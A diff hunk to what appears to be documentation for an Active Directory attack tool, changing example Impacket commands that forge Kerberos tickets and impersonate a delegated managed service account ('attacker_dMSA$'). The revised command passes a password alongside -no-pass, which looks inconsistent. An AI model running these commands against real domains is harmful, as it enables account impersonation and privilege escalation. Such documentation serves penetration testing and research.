@@ -126,8 +126,7 @@ Fill placeholders like `<AES256KEY>` and `<BASE64TGT>` with actual values from p
 ## Impacket
 Example commands generated for ticket forging:
 ```
-getTGT.py '<domain>/Pwn$:Password123!'
-KRB5CCNAME=Pwn$.ccache getST.py '<domain>/Pwn$' -k -no-pass -dmsa -self -impersonate 'attacker_dMSA$'
+getST.py '<domain>/Pwn$:Password123!' -k -no-pass -dmsa -self -impersonate 'attacker_dMSA$'
 ```
 
 ---
